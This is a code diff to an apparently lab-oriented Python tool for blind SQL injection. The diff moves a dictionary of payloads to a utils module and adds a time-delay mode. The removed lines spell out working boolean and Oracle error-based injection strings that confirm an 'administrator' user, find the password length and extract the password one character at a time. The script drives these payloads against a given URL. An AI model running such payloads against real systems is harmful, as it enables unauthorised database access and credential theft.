@@ -35,26 +35,8 @@ cm1O48qFb9AFJKwU' ADD (SELECT 'x' FROM users WHERE username='administrator')='x'
 import argparse
 from concurrent.futures import ThreadPoolExecutor
 from injector import Injector
+from utils import POISON_STASH
 
-
-POISON_STASH = dict(
-
-    conditional = dict(
-        boolean_condition="' AND '1'='1'--",
-        user_table_confirm="' AND(SELECT 'x' FROM users LIMIT 1)='x'--",
-        confirm_admin_user="' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--",
-        admin_password_limit="' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password){}{})='x'--",
-        password_harvester="' AND (SELECT 'x' FROM users WHERE username='administrator' and ASCII(SUBSTRING(password,{},1)){}{})='x'--",
-    ),
-
-    error_induction= dict(
-        boolean_condition="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
-        user_table_confirm="'||(SELECT '' FROM users ROWNUM=1)||'",
-        confirm_admin_user="'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
-        admin_password_limit="'||(SELECT CASE WHEN LENGTH(password){}{} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
-        password_harvester="'||(SELECT CASE WHEN ASCII(SUBSTR(password, {},1)){}{} THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'",
-    )
-)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -67,6 +49,7 @@ if __name__ == "__main__":
 
     group.add_argument('--conditional', action ='store_true')
     group.add_argument('--errorInduction', action ='store_true')
+    group.add_argument('--timeDelay', action ='store_true')
 
     args = parser.parse_args()
 
@@ -90,9 +73,16 @@ if __name__ == "__main__":
             error_induction=True
         )
 
-    length = injector.find_password_length()
+    if args.timeDelay:
 
-    print(f'Password length: {length}')
+        injector = Injector(
+            url=args.url,
+            poison=POISON_STASH['time_delay'],
+            length_scope=args.space,
+            time_delay=True
+        )
+
+    length = injector.find_password_length()
 
     unknowns = [{"confirmed": None, "position": n+1} for n in range(length)]
 
